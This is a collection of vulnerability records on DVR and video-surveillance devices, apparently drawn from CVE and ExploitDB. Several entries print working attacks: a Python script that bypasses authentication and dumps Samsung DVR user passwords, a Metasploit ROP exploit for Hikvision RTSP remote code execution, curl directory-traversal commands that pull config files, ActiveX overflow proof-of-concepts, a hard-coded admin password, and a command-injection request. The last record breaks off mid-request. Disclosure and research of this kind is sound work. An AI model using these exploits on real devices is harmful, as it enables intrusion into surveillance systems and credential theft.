{'source': 'CVE', '_id': '2017-6432', 'description': 'An issue was discovered on Dahua DHI-HCVR7216A-S3 3.210.0001.10 build 2016-06-06 devices. The Dahua DVR Protocol, which operates on TCP Port 37777, is an unencrypted, binary protocol. Performing a Man-in-the-Middle attack allows both sniffing and injections of packets, which allows creation of fully privileged new users, in addition to capture of sensitive information.', 'osvdb': [], 'bid': [], 'cve': ['CVE-2017-6432'], 'msb': []}
{'source': 'CVE', '_id': '2018-9995', 'description': 'TBK DVR4104 and DVR4216 devices, as well as Novo, CeNova, QSee, Pulnix, XVR 5 in 1, Securus, Night OWL, DVR Login, HVR Login, and MDVR Login, which run re-branded versions of the original TBK DVR4104 and DVR4216 series, allow remote attackers to bypass authentication via a "Cookie: uid=admin" header, as demonstrated by a device.rsp?opt=user&cmd=list request that provides credentials within JSON data in a response.', 'osvdb': [], 'bid': [], 'cve': ['CVE-2018-9995'], 'msb': []}
{'source': 'CVE', '_id': '2013-5754', 'description': 'The authorization implementation on Dahua DVR appliances accepts a hash string representing the current date for the role of a master password, which makes it easier for remote attackers to obtain administrative access and change the administrator password via requests involving (1) ActiveX, (2) a standalone client, or (3) unspecified other vectors, a different vulnerability than CVE-2013-3612.', 'osvdb': [], 'bid': [], 'cve': ['CVE-2013-5754'], 'msb': []}
{'code': 'Digital Security Research Group [DSecRG] Advisory       #DSECRG-09-036\r\n\r\noriginal advisory: http://dsecrg.com/pages/vul/DSECRG-09-036.html\r\n\r\nApplication:                Chance-i DiViS DVR System web-server\r\nVersions Affected:          2.0\r\nVendor URL:                 http://www.chance-i.com/\r\nBug:                        Directory Traversal File Download\r\nExploits:                   YES\r\nReported:                   13.03.2009\r\nSecond Reported:            20.03.2009\r\nSolution:                   NONE\r\nDate of Public Advisory:    09.04.2009\r\nAuthor:                     Digital Security Research Group [DSecRG] (research [at] dsecrg [dot] com)\r\n\r\n\r\n\r\nDescription\r\n***********\r\n\r\nDiViS DVR System web-server which fingerprints as Techno Vision Security System has Directory Traversal vulnerability.\r\n\r\n\r\n\r\nDetails\r\n*******\r\n\r\nDirectory traversal vulnerability find in DiViS DVR System web-server.\r\n\r\nSuccessfully exploiting these issues allows remote attackers to access the contents of arbitrary files.\r\n\r\nExample:\r\n\r\nhttp://[server]/../../../../../../../boot.ini\r\n\r\n\r\n\r\nSolution:\r\n*********\r\n\r\nWe did not get any response from vendor for more than 2 weeks.\r\n\r\nNo patches aviable.\r\n\r\n\r\n\r\nAbout\r\n*****\r\n\r\nDigital Security is leading IT security company in Russia, providing information security consulting, audit and penetration testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and PCI DSS standards.\r\nDigital Security Research Group focuses on web application and database security problems with vulnerability reports, advisories and whitepapers posted regularly on our website.\r\n\r\n\r\nContact:    research [at] dsecrg [dot] com\r\n            http://www.dsecrg.com\r\n            http://www.dsec.ru\r\n\r\n# milw0rm.com [2009-04-10]', 'description': 'Chance-i DiViS DVR System Web-Server - Directory Traversal', 'author': 'DSecRG', '_id': 8392, 'source': 'ExploitDB', 'platform': 'windows', 'date': '2009-04-10T00:00:00+00:00', 'cve': [], 'type': 'remote', 'port': 0}
{'code': '# Exploit Title: TVT TD-2308SS-B DVR directory traversal\r\n# Shodan Dork: "Cross Web Server"\r\n# Date: 01 Dec 2013\r\n# Disclosure date: 10 Sep 2013\r\n# Exploit Author: Cesar Neira\r\n# Vendor Homepage: http://en.tvt.net.cn/\r\n# Affected Firmware Versions:\r\n3.1.43.B\r\n3.1.43.P\r\n3.1.6.P-1.0.2.1-03\r\n3.1.75.B-1.0.2.1-00\r\n3.1.7.B-1.0.2.1-00\r\n3.1.81.B-1.0.2.1-00\r\n3.1.83.B-1.0.2.1-00\r\n3.1.83.P-1.0.4.2-03\r\n3.1.87.P-1.0.4.2-17\r\n3.1.91.P-1.0.2.1-03\r\n3.1.92.P-1.0.2.1-00\r\n3.1.93.B-1.0.2.1-17\r\n3.2.0.B-1.0.2.1-17\r\n3.2.0.P-1.0.2.1-03\r\n3.2.0.P-1.0.2.1-17\r\n3.2.0.P-1.0.6.0.32-00\r\n3.2.0.P-3520A-00\r\n3.2.0.P-3520A-03\r\n3.2.0.P-3531-00\r\n3.2.0.P-3531-11\r\n3.2.0.P-FH-00\r\n3.2.9.P-3520A-06\r\nmaybe others.\r\n# Tested on: TVT DVR TD-2308SS-B\r\n# CVE : CVE-2013-6023\r\n# References:\r\nhttp://www.kb.cert.org/vuls/id/785838\r\nhttp://alguienenlafisi.blogspot.com/2013/10/dvr-tvt-directory-traversal.html\r\n\r\nPOC:\r\n\r\ncurl http://[IP Address]/../../../mnt/mtd/config/config.dat 2>/dev/null | strings\r\n\r\n-- \r\nCesar Neira <csar.1603@gmail.com>\r\nhttp://alguienenlafisi.blogspot.com\r\nRoot-Node\r\n\r\n\r\nExploit-DB Mirror: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/29959.nse', 'description': 'TVT TD-2308SS-B DVR - Directory Traversal', 'author': 'Cesar Neira', '_id': 29959, 'source': 'ExploitDB', 'platform': 'hardware', 'date': '2013-12-01T00:00:00+00:00', 'cve': ['CVE-2013-6023'], 'type': 'webapps', 'port': 0}
{'source': 'CVE', '_id': '2013-4980', 'description': 'Buffer overflow in the RTSP Packet Handler in AVTECH AVN801 DVR with firmware 1017-1003-1009-1003 and earlier, and possibly other devices, allows remote attackers to cause a denial of service (device crash) and possibly execute arbitrary code via a long string in the URI in an RTSP SETUP request.', 'osvdb': [96692], 'bid': [], 'cve': ['CVE-2013-4980'], 'msb': []}
{'code': '**************************************************************\r\nTitle: Samsung DVR authentication bypass\r\nVersion affected: firmware version <= 1.10\r\nVendor: Samsung - www.samsung-security.com\r\nDiscovered by: Andrea Fabrizi\r\nEmail: andrea.fabrizi@gmail.com\r\nWeb: http://www.andreafabrizi.it\r\nTwitter: @andreaf83\r\nStatus: unpatched\r\n**************************************************************\r\n\r\nSamsung provides a wide range of DVR products, all working with nearly\r\nthe same firmware. The firmware it\'s a Linux embedded system that\r\nexpose a web interface through the lighttpd webserver and CGI pages.\r\n\r\nThe authenticated session is tracked using two cookies, called DATA1\r\nand DATA2, containing respectively the base64 encoded username and\r\npassword. So, the first advise for the developers is to don\'t put the\r\nuser credentials into the cookies!\r\n\r\nAnyway, the critical vulnerability is that in most of the CGI, the\r\nsession check is made in a wrong way, that allows to access protected\r\npages simply putting an arbitrary cookie into the HTTP request. Yes,\r\nthat\'s all.\r\n\r\nThis vulnerability allows remote unauthenticated users to:\r\n- Get/set/delete username/password of local users (/cgi-bin/setup_user)\r\n- Get/set DVR/Camera general configuration\r\n- Get info about the device/storage\r\n- Get/set the NTP server\r\n- Get/set many other settings\r\n\r\nVulnerables CGIs:\r\n- /cgi-bin/camera_privacy_area\r\n- /cgi-bin/dev_camera\r\n- /cgi-bin/dev_devinfo\r\n- /cgi-bin/dev_devinfo2\r\n- /cgi-bin/dev_hddalarm\r\n- /cgi-bin/dev_modechange\r\n- /cgi-bin/dev_monitor\r\n- /cgi-bin/dev_pos\r\n- /cgi-bin/dev_ptz\r\n- /cgi-bin/dev_remote\r\n- /cgi-bin/dev_spotout\r\n- /cgi-bin/event_alarmsched\r\n- /cgi-bin/event_motion_area\r\n- /cgi-bin/event_motiondetect\r\n- /cgi-bin/event_sensordetect\r\n- /cgi-bin/event_tamper\r\n- /cgi-bin/event_vldetect\r\n- /cgi-bin/net_callback\r\n- /cgi-bin/net_connmode\r\n- /cgi-bin/net_ddns\r\n- /cgi-bin/net_event\r\n- /cgi-bin/net_group\r\n- /cgi-bin/net_imagetrans\r\n- /cgi-bin/net_recipient\r\n- /cgi-bin/net_server\r\n- /cgi-bin/net_snmp\r\n- /cgi-bin/net_transprotocol\r\n- /cgi-bin/net_user\r\n- /cgi-bin/rec_event\r\n- /cgi-bin/rec_eventrecduration\r\n- /cgi-bin/rec_normal\r\n- /cgi-bin/rec_recopt\r\n- /cgi-bin/rec_recsched\r\n- /cgi-bin/restart_page\r\n- /cgi-bin/setup_admin_setup\r\n- /cgi-bin/setup_datetimelang\r\n- /cgi-bin/setup_group\r\n- /cgi-bin/setup_holiday\r\n- /cgi-bin/setup_ntp\r\n- /cgi-bin/setup_systeminfo\r\n- /cgi-bin/setup_user\r\n- /cgi-bin/setup_userpwd\r\n- /cgi-bin/webviewer\r\n\r\nPoC exploit to list device users and password:\r\nhttp://www.andreafabrizi.it/download.php?file=samsung_dvr.py\r\n#!/usr/bin/env python\r\n#\r\n#**************************************************************\r\n#Title: Samsung DVR authentication bypass\r\n#Version affected: firmware version <= 1.10\r\n#Vendor: Samsung - www.samsung-security.com\r\n#Discovered by: Andrea Fabrizi\r\n#Email: andrea.fabrizi@gmail.com\r\n#Web: http://www.andreafabrizi.it\r\n#Twitter: @andreaf83\r\n#Status: unpatched\r\n#**************************************************************\r\n\r\n\r\nimport urllib2\r\nimport re\r\nimport sys\r\n\r\nif __name__ == "__main__":\r\n\r\n    if len(sys.argv) != 2:\r\n        print "usage: %s [TARGET]" % sys.argv[0]\r\n        sys.exit(1)\r\n\r\n    ip = sys.argv[1]\r\n    headers = {"Cookie" : "DATA1=YWFhYWFhYWFhYQ==" }\r\n\r\n    print "SAMSUNG DVR Authentication Bypass"\r\n    print "Vulnerability and exploit by Andrea Fabrizi <andrea.fabrizi@gmail.com>\\n"\r\n    print "Target => %s\\n" % ip\r\n\r\n    #Dumping users\r\n    print "##### DUMPING USERS ####"\r\n    req = urllib2.Request("http://%s/cgi-bin/setup_user" % ip, None, headers)\r\n    response = urllib2.urlopen(req)\r\n    user_found = False\r\n\r\n    for line in response.readlines():\r\n\r\n        exp = re.search(".*<input type=\\\'hidden\\\' name=\\\'nameUser_Name_[0-9]*\\\' value=\\\'(.*)\\\'.*", line)\r\n        if exp:\r\n            print exp.group(1),\r\n\r\n        exp = re.search(".*<input type=\\\'hidden\\\' name=\\\'nameUser_Pw_[0-9]*\\\' value=\\\'(.*)\\\'.*", line)\r\n        if exp:\r\n            print ": " + exp.group(1)\r\n            user_found = True\r\n\r\n        exp = re.search(".*<input type=hidden name=\\\'admin_id\\\' value=\\\'(.*)\\\'.*", line)\r\n        if exp:\r\n            print "Admin ID => %s" % exp.group(1)\r\n\r\n    \r\n    if not user_found:\r\n        print "No user found."', 'description': 'Samsung DVR Firmware 1.10 - Authentication Bypass', 'author': 'Andrea Fabrizi', '_id': 27753, 'source': 'ExploitDB', 'platform': 'hardware', 'date': '2013-08-21T00:00:00+00:00', 'cve': [], 'type': 'webapps', 'port': 80}
{'source': 'CVE', '_id': '2007-5456', 'description': 'Microsoft Internet Explorer 7 and earlier allows remote attackers to bypass the "File Download - Security Warning" dialog box and download arbitrary .exe files by placing a \'?\' (question mark) followed by a non-.exe filename after the .exe filename, as demonstrated by (1) .txt, (2) .cda, (3) .log, (4) .dif, (5) .sol, (6) .htt, (7) .itpc, (8) .itms, (9) .dvr-ms, (10) .dib, (11) .asf, (12) .tif, and unspecified other extensions, a different issue than CVE-2004-1331.  NOTE: this issue might not cross privilege boundaries, although it does bypass an intended protection mechanism.', 'osvdb': [], 'bid': [26062], 'cve': ['CVE-2007-5456'], 'msb': []}
{'code': 'Digital Security Research Group [DSecRG] Advisory       #DSECRG-09-035\r\n\r\noriginal advisory:   http://dsecrg.com/pages/vul/DSECRG-09-035.html\r\n\r\n\r\nApplication:                Chance-i DiViS-Web DVR System ActiveX control\r\nVersions Affected:          3,0,0,7\r\nVendor URL:                 http://www.chance-i.com/\r\nBug:                        Heap Overflow\r\nExploits:                   YES\r\nReported:                   13.03.2009\r\nSecond Reported:            20.03.2009\r\nSolution:                   NONE\r\nDate of Public Advisory:    09.04.2009\r\nAuthor:                     Digital Security Research Group [DSecRG] (research [at] dsecrg [dot] com)\r\n\r\n\r\n\r\nDescription\r\n***********\r\n\r\nDiViS-Web ActiveX (ActiveView.cab) has Heap Overflow vulnerability.\r\n\r\n\r\n\r\nDetails\r\n*******\r\n\r\nHeap overflow vulnerability found in AddSiteEx() function.\r\n\r\nThere is an exploitable heap overflow vulnerability in DVR\'s ActiveX\r\ncontrol (ActiveView.cab).\r\n\r\nIf an DVR user were to visit a malicious web page, the overflow could be triggered allowing for a "remote" compromise of the user\'s machine. Alternatively, an attacker could send their target a specially crafted e-mail, loaded with an exploit to take advantage of this vulnerability.\r\n\r\nThe problem arises by passing an overly long string to the AddSiteEx\r\nmethod of the control.\r\n\r\nPoC:\r\n\r\n    <OBJECT ID="DVR" classid="clsid:66F7F252-3FE1-4650-B1E5-94B2A38271C5" STYLE="width: 0px;">\r\n    <PARAM NAME="_Version" VALUE="65536">\r\n    <PARAM NAME="_ExtentX" VALUE="18203">\r\n    <PARAM NAME="_ExtentY" VALUE="13705">\r\n    <PARAM NAME="_StockProps" VALUE="0">\r\n    <PARAM NAME="Split" VALUE="4">\r\n    </OBJECT>\r\n\r\n    //server address\r\n    var g_sAddress = location.hostname;\r\n    var g_sId = "";\r\n    var g_sPwd = "";\r\n    var g_bLogin = false;\r\n    var g_nMaxCamera = 16;\r\n\r\n    // Port setting\r\n    var g_nImage = 3000;\r\n    var g_nControl = 3001;\r\n    var g_nSound = 8800;\r\n\r\n    var long_buff = "alexsint";\r\n\r\n    while(long_buff.length<(550*8)) long_buff = long_buff + "alexsint"; //rewrite registers\r\n\r\n    DVR.Channels = 1;\r\n\r\n    DVR.AddSiteEx("", "", long_buff, "", 0, g_nImage, g_nControl, g_nSound); //Crash on Free() at ntdll\r\n\r\n\r\n\r\nSolution\r\n********\r\n\r\nWe did not get any response from vendor for more than 2 weeks.\r\n\r\nNo patches aviable.\r\n\r\n\r\n\r\nAbout\r\n*****\r\n\r\nDigital Security is leading IT security company in Russia, providing information security consulting, audit and penetration testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and PCI DSS standards.\r\nDigital Security Research Group focuses on web application and database security problems with vulnerability reports, advisories and whitepapers posted regularly on our website.\r\n\r\n\r\nContact:    research [at] dsecrg [dot] com\r\n            http://www.dsecrg.com\r\n            http://www.dsec.ru\r\n\r\n# milw0rm.com [2009-04-10]', 'description': 'Chance-i DiViS-Web DVR System - ActiveX Control Heap Overflow (PoC)', 'author': 'DSecRG', '_id': 8391, 'source': 'ExploitDB', 'platform': 'windows', 'date': '2009-04-10T00:00:00+00:00', 'cve': [], 'type': 'dos', 'port': 0}
{'source': 'CVE', '_id': '2011-0032', 'description': 'Untrusted search path vulnerability in DirectShow in Microsoft Windows Vista SP1 and SP2, Windows 7 Gold and SP1, Windows Server 2008 R2 and R2 SP1, and Windows Media Center TV Pack for Windows Vista allows local users to gain privileges via a Trojan horse DLL in the current working directory, as demonstrated by a directory that contains a Digital Video Recording (.dvr-ms), Windows Recorded TV Show (.wtv), or .mpg file, aka "DirectShow Insecure Library Loading Vulnerability."', 'osvdb': [71015], 'bid': [46682], 'cve': ['CVE-2011-0032'], 'msb': ['MS11-015']}
{'code': 'Disclosure: 09/01/2014 / Last updated: 18/01/2015\r\n\r\n\r\nHi,\r\n\r\nI have discovered a buffer overflow vulnerability that allows remote code execution in an ActiveX control bundled by a manufacturer of video surveillance systems. \r\nThe company is Lorex Technologies, a major video surveillance manufacturer that is very popular in the US and East Asia. Their affected product range is the EDGE series, which has 16 products in it. I have confirmed that all 16 are vulnerable at this point in time. These security DVR\'s are remotely accessible, and when you access it on a Windows computer with Internet Explorer, they try to install the vulnerable ActiveX control INetViewX. The Lorex manual[1] instructs the user to blindly accept the ActiveX control install when prompted. \r\nThe full list of devices, as well as links to the firware download, can be found in [2]. Their products offer remote video viewing capabilities, and you can find some of them on Shodan[3]. \r\n\r\nThe buffer overflow can be triggered by a really long string (10000+ characters) in the HTTP_PORT parameter. The instruction pointer can be very easily controlled in XP by the characters 109 to 113 in the string. Please refer to the PoC file lorex-testcase.html. You will see that the HTTP_PORT parameter is composed of D\'s, apart from chars 109 to 113 which are four A\'s. If you open this file in IE after installing the control, you will see that IE will crash with an EIP of 0x41414141. Changing the four A\'s to any other value will cause EIP to crash on that value. \r\n\r\nThe list below tells a better story about what is affected and how it can be controlled:\r\nWin XP SP3 with IE6 - Fully exploitable as described\r\nWin XP SP3 with IE8 - Could not get it to crash (????)\r\nWin 7 x64 with IE10 fully patched - Fully exploitable, though not as easy as for XP (see analyze -v [4] and !exploitable [5] outputs)\r\n\r\nTo verify this vulnerability you can download and extract the firmware using binwalk (http://code.google.com/p/binwalk/). To do so, please follow the instructions in [6], and then install the ActiveX control in INetViewProj1_02030330.cab. \r\n\r\nI have contacted Lorex and they initially said they would fix it, but went radio silent shortly afterwards.\r\n17.11.2013 - Initial contact via support page\r\n18.11.2013 - Email to sales, no response.\r\n21.11.2013 - Second email to sales, received response by sales saying they will forward it to technical support and get back to me.\r\n04.12.2013 - Third email to sales saying that technical support never contacted me back. No response.\r\n08.01.2014 - MITRE assigns CVE-2014-1201 to this issue.\r\n09.01.2014 - Public disclosure.\r\n\r\nAll references can be found at:\r\nhttps://github.com/pedrib/PoC/blob/master/lorexActivex/lorex-report.txt\r\n\r\nProof of concept:\r\nhttps://raw.githubusercontent.com/pedrib/PoC/master/lorexActivex/lorex-testcase.html\r\n\r\nRegards,\r\nPedro Ribeiro (pedrib@gmail.com)\r\nAgile Information Security \r\n\r\n\r\n-------------------------\r\n[1] Lorex manual for LH300 series\r\n-------------------------\r\nhttp://www.lorextechnology.com/downloads/security-dvr/LH300-Series/LH300_SERIES_MANUAL_EN_R2_web.pdf\r\n\r\n\r\n-------------------------\r\n[2] List of vulnerable device families and URL for firmware download\r\n-------------------------\r\nLH340-Series 960H security video recorder Edge 3 series (2 devices affected)\r\nhttp://www.lorextechnology.com/downloads/security-dvr/LH340-Series/LH340_SERIES_FIRMWARE_8CH_11.19.85_1FE3A.zip\r\n\r\nLH330-Series Security DVR system Edge2 series (3 devices affected)\r\nhttp://www.lorextechnology.com/downloads/security-dvr/LH330-Series/LH330_SERIES_FIRMWARE_8CH_11.17.38-33_1D97A.zip\r\n\r\nLH320-Series Surveillance DVR Edge+ series (5 devices affected)\r\nhttp://www.lorextechnology.com/downloads/security-dvr/LH300-Series/LH300_SERIES_FIRMWARE_4CH_7-35-28-1B26E.zip\r\n\r\nLH310-Series DVR for surveillance cameras Edge series (6 devices affected)\r\nhttp://www.lorextechnology.com/downloads/security-dvr/LH300-Series/LH300_SERIES_FIRMWARE_4CH_7-35-28-1B26E.zip\r\n\r\n\r\n\r\n-------------------------\r\n[3] Shodan link for Lorex DVR\'s\r\n-------------------------\r\nhttps://scanhub.shodan.io/scanhub-demo/search?q=%28os.name%3A%22LOREX+SECURITY+DVR%22%29+AND+os.name.name_facet%3A%22Lorex+Security+DVR%22\r\n\r\n\r\n-------------------------\r\n[4] Win 7 x64 IE10 Analyze -v output\r\n-------------------------\r\nFOLLOWUP_IP: \r\nINetViewProj1!Inetviewimpl1Finalize+563d\r\n09a7f911 f2ae            repne scas byte ptr es:[edi]\r\n\r\nAPP:  iexplore.exe\r\n\r\nPRIMARY_PROBLEM_CLASS:  WRONG_SYMBOLS\r\n\r\nBUGCHECK_STR:  APPLICATION_FAULT_WRONG_SYMBOLS\r\n\r\nIP_ON_HEAP:  0000000044444444\r\nThe fault address in not in any loaded module, please check your build\'s rebase\r\nlog at <releasedir>\\bin\\build_logs\\timebuild\\ntrebase.log for module which may\r\ncontain the address if it were loaded.\r\n\r\nIP_IN_FREE_BLOCK: 44444444\r\n\r\nFRAME_ONE_INVALID: 1\r\n\r\nLAST_CONTROL_TRANSFER:  from 0000000044444444 to 0000000009a7f911\r\n\r\nSTACK_TEXT:  \r\nWARNING: Stack unwind information not available. Following frames may be wrong.\r\n04bbc724 44444444 44444444 44444444 44444444 INetViewProj1!Inetviewimpl1Finalize+0x563d\r\n04bbc728 44444444 44444444 44444444 44444444 0x44444444\r\n04bbc72c 44444444 44444444 44444444 44444444 0x44444444\r\n04bbc730 44444444 44444444 44444444 44444444 0x44444444\r\n04bbc734 44444444 44444444 44444444 44444444 0x44444444\r\n\r\n\r\n-------------------------\r\n[5] Win 7 x64 IE10 !exploitable output\r\n-------------------------\r\n0:008:x86> !exploitable\r\n\r\n!exploitable 1.6.0.0\r\nExploitability Classification: EXPLOITABLE\r\nRecommended Bug Title: Exploitable - Exception Handler Chain Corrupted starting at INetViewProj1!Inetviewimpl1Finalize+0x000000000000563d (Hash=0xe1e32303.0x6b2fc9c7)\r\n\r\nCorruption of the exception handler chain is considered exploitable\r\n\r\n\r\n-------------------------\r\n[6] How to extract the vulnerable ActiveX control from the firmware image\r\n-------------------------\r\nwget http://www.lorextechnology.com/downloads/security-dvr/LH340-Series/LH340_SERIES_FIRMWARE_8CH_11.19.85_1FE3A.zip\r\nunzip LH340_SERIES_FIRMWARE_8CH_11.19.85_1FE3A.zip\r\nbinwalk -e 62082\\(lorex\\)os_11.19.85_1FE3A.rom\r\ncd _62082\\(lorex\\)os_11.19.85_1FE3A.rom.extracted/\r\n7z x 6B2000\r\ncd web\r\nls -la INetViewProj1_02030330.cab\r\n\r\n\r\n\r\n\r\n\r\n\r\n<!--\r\nCOM Object - {05B550C0-E424-4F91-9928-EA970817BFC0} INetViewX Control\r\n*******************************************************************************\r\nCOM Object Filename : E:\\lorex-ocx\\INetViewProj1_02030160.ocx\r\nMajor Version       : 2\r\nMinor Version       : 3\r\nBuild Number        : 1\r\nRevision Number     : 60\r\nProduct Version     : 1.0.0.0\r\nProduct Name        : \r\nCompany Name        : \r\nLegal Copyright     : \r\nComments            : \r\nFile Description    : \r\nFile Version        : 2.3.1.60\r\nInternal Name       : \r\nLegal Trademarks    : \r\nPrivate Build       : not found\r\nSpecial Build       : not found\r\nLanguage            : not found\r\n*******************************************************************************\r\n-->\r\n<object id=TestObj classid="CLSID:{05B550C0-E424-4F91-9928-EA970817BFC0}" style="width:100;height:350">\r\n<param NAME="Properties" VALUE="a">\r\n<param NAME="Contents" VALUE="b">\r\n<param NAME="DVRIP" VALUE="c">\r\n<param NAME="HTTP_PORT" VALUE="">\r\n<param NAME="DVR_UK" VALUE="d">\r\n<param NAME="HTTP_PAGE" VALUE="e">\r\n</object>', 'description': 'Lorex LH300 Series - ActiveX Buffer Overflow (PoC)', 'author': 'Pedro Ribeiro', '_id': 43891, 'source': 'ExploitDB', 'platform': 'hardware', 'date': '2015-01-18T00:00:00+00:00', 'cve': ['CVE-2014-1201'], 'type': 'dos', 'port': 0}
{'code': '##\r\n# This module requires Metasploit: http//metasploit.com/download\r\n# Current source: https://github.com/rapid7/metasploit-framework\r\n##\r\n\r\nrequire \'msf/core\'\r\n\r\nclass Metasploit4 < Msf::Exploit::Remote\r\n  Rank = NormalRanking\r\n\r\n  include Exploit::Remote::Tcp\r\n\r\n  def initialize(info = {})\r\n    super(update_info(info,\r\n      \'Name\'           => \'Hikvision DVR RTSP Request Remote Code Execution\',\r\n      \'Description\'    => %q{\r\n        This module exploits a buffer overflow in the RTSP request parsing\r\n        code of Hikvision DVR appliances. The Hikvision DVR devices record\r\n        video feeds of surveillance cameras and offer remote administration\r\n        and playback of recorded footage.\r\n\r\n        The vulnerability is present in several models / firmware versions\r\n        but due to the available test device this module only supports\r\n        the DS-7204 model.\r\n      },\r\n      \'Author\'         =>\r\n        [\r\n          \'Mark Schloesser <mark_schloesser[at]rapid7.com>\', # @repmovsb, vulnerability analysis & exploit dev\r\n        ],\r\n      \'License\'        => MSF_LICENSE,\r\n      \'References\'     =>\r\n        [\r\n          [ \'CVE\', \'2014-4880\' ],\r\n          [ \'URL\', \'https://community.rapid7.com/community/metasploit/blog/2014/11/19/r7-2014-18-hikvision-dvr-devices--multiple-vulnerabilities\' ]\r\n        ],\r\n      \'Platform\'       => \'linux\',\r\n      \'Arch\'           => ARCH_ARMLE,\r\n      \'Privileged\'     => true,\r\n      \'Targets\'        =>\r\n        [\r\n          #\r\n          # ROP targets are difficult to represent in the hash, use callbacks instead\r\n          #\r\n          [ "DS-7204 Firmware V2.2.10 build 131009", {\r\n\r\n            # The callback handles all target-specific settings\r\n            :callback => :target_ds7204_1,\r\n              \'g_adjustesp\' => 0x002c828c,\r\n              # ADD             SP, SP, #0x350\r\n              # LDMFD           SP!, {R4-R6,PC}\r\n\r\n              \'g_r3fromsp\'  => 0x00446f80,\r\n              # ADD             R3, SP, #0x60+var_58\r\n              # BLX             R6\r\n\r\n              \'g_blxr3_pop\' => 0x00456360,\r\n              # BLX             R3\r\n              # LDMFD           SP!, {R1-R7,PC}\r\n\r\n              \'g_popr3\'     => 0x0000fe98,\r\n              # LDMFD           SP!, {R3,PC}\r\n          } ],\r\n\r\n          [ "Debug Target", {\r\n\r\n            # The callback handles all target-specific settings\r\n            :callback => :target_debug\r\n\r\n          } ]\r\n\r\n        ],\r\n      \'DefaultTarget\'  => 0,\r\n      \'DisclosureDate\' => \'Nov 19 2014\'))\r\n\r\n    register_options(\r\n      [\r\n        Opt::RPORT(554)\r\n      ], self.class)\r\n  end\r\n\r\n  def exploit\r\n    unless self.respond_to?(target[:callback])\r\n      fail_with(Failure::NoTarget, "Invalid target specified: no callback function defined")\r\n    end\r\n\r\n    device_rop = self.send(target[:callback])\r\n\r\n    request =  "PLAY rtsp://#{rhost}/ RTSP/1.0\\r\\n"\r\n    request << "CSeq: 7\\r\\n"\r\n    request << "Authorization: Basic "\r\n    request << rand_text_alpha(0x280 + 34)\r\n    request << [target["g_adjustesp"]].pack("V")[0..2]\r\n    request << "\\r\\n\\r\\n"\r\n    request << rand_text_alpha(19)\r\n\r\n    # now append the ropchain\r\n    request << device_rop\r\n    request << rand_text_alpha(8)\r\n    request << payload.encoded\r\n\r\n    connect\r\n    sock.put(request)\r\n    disconnect\r\n  end\r\n\r\n  # These devices are armle, run version 1.3.1 of libupnp, have random stacks, but no PIE on libc\r\n  def target_ds7204_1\r\n    # Create a fixed-size buffer for the rop chain\r\n    ropbuf = rand_text_alpha(24)\r\n\r\n    # CHAIN = [\r\n    #   0, #R4 pop adjustsp\r\n    #   0, #R5 pop adjustsp\r\n    #   GADGET_BLXR3_POP, #R6 pop adjustsp\r\n    #   GADGET_POPR3,\r\n    #   0, #R3 pop\r\n    #   GADGET_R3FROMSP,\r\n    # ]\r\n\r\n    ropbuf[8,4] = [target["g_blxr3_pop"]].pack("V")\r\n    ropbuf[12,4] = [target["g_popr3"]].pack("V")\r\n    ropbuf[20,4] = [target["g_r3fromsp"]].pack("V")\r\n\r\n    return ropbuf\r\n  end\r\n\r\n  # Generate a buffer that provides a starting point for exploit development\r\n  def target_debug\r\n    Rex::Text.pattern_create(2000)\r\n  end\r\n\r\n  def rhost\r\n    datastore[\'RHOST\']\r\n  end\r\n\r\n  def rport\r\n    datastore[\'RPORT\']\r\n  end\r\n\r\nend', 'description': 'Hikvision DVR - RTSP Request Remote Code Execution (Metasploit)', 'author': 'Metasploit', '_id': 35356, 'source': 'ExploitDB', 'platform': 'linux', 'date': '2014-11-24T00:00:00+00:00', 'cve': [], 'type': 'remote', 'port': 554}
{'code': '# Exploit Title: Visual Tools DVR multiple vulnerabilities\r\n# Date: 2012-10-15\r\n# Exploit Author: Andrea Fabrizi\r\n# Vendor Homepage: http://www.visual-tools.com/\r\n# Version: VS Series <= 3.0.6.16, VX Series <= 4.2.19.2\r\n# Tested on: VS Series 3.0.6.16/VX Series 4.2.19.2\r\n\r\nVisual Tools develops, manufactures and commercializes video\r\nsurveillance and video observations systems under the global brand\r\nname VideoSafe Technology or under other companies� brand names.\r\n\r\nThe DVR systems are based on x86 Debian GNU Linux embedded (aka\r\nemdebian) and the entire framework and software are written using\r\nPython.\r\n\r\nAfter a full reverse engineering of the firmware i discovered some\r\ninteresting vulnerabilities, that allow an unauthorized user to access\r\nthe DVR web interface and gain a root shell on the system. At the time\r\ni write this advisory, all DVR products commercialized by Visual\r\nTools, based on this firmware, are vulnerable.\r\n\r\n1]======== Administration password disclosure ========\r\nThe system expose an hidden cgi that disclose the\r\nOperator/Supervisor/Administrator password if invoked during the first\r\nten minutes after system boot.\r\n\r\n- http://DVR_ADDRESS/cgi-bin/util/passwords.py\r\n\r\nIs possible to write a simple script that check the cgi, every five\r\nminutes for example, waiting for the device reboot, that sooner or\r\nlater, will happen :)\r\n\r\n2]======== Default Administration password ========\r\nAs the previous vulnerability, also in this case is possible to access\r\nany DVR system, during the first ten minutes after system boot, using\r\nan hard-coded password.\r\n\r\nThe default password is: elefante (valid for\r\nOperator/Supervisor/Administrator account)\r\n\r\n3]======== Log files disclosure ========\r\nThe system expose an hidden cgi that allow any unauthenticated user to\r\nget the system log files. By default the script does not works,\r\nbecause the zip file is generated into the cgi-bin directory.\r\nBut... taking advantage of a directory traversal vulnerability that\r\naffect the same script, is possible to write the zip file into the\r\napache root directory, and download it directly via browser.\r\n\r\n- http://DVR_ADDRESS/cgi-bin/util/ziplogs.py?filename=../../html/logs\r\n- http://DVR_ADDRESS/logs.zip (the zip file generated)\r\n\r\nMoreover, the file "service.log" contains the Session ID of the\r\nauthenticated user, that can be used to hijack an existing session.\r\n\r\n4]======== recv_ip_filtering.py command injection ========\r\nIs possible, for authenticated users, to exploit a command injection\r\nvulnerability that affects the script\r\n/cgi-bin/conf/recv_ip_filtering.py.\r\nThis script, used to add or remove ip addresses from the local\r\niptables, accept one parameter that contains a list of IPs separated\r\nby space, so is not possible to execute directly a command that\r\ncontains a space char.\r\nA workaround can be done passing the command through an http header\r\n(user-agent for example), and invoking the corresponding environment\r\nvariable.\r\n\r\nThis is a sample request:\r\nPOST http://DVR_ADDRESS/cgi-bin/conf/recv_ip_filtering.py HTTP/1.1\r\nUser-Agent: [COMMAND]\r\nCookie: language=en; session=VALID_SESSION_ID; 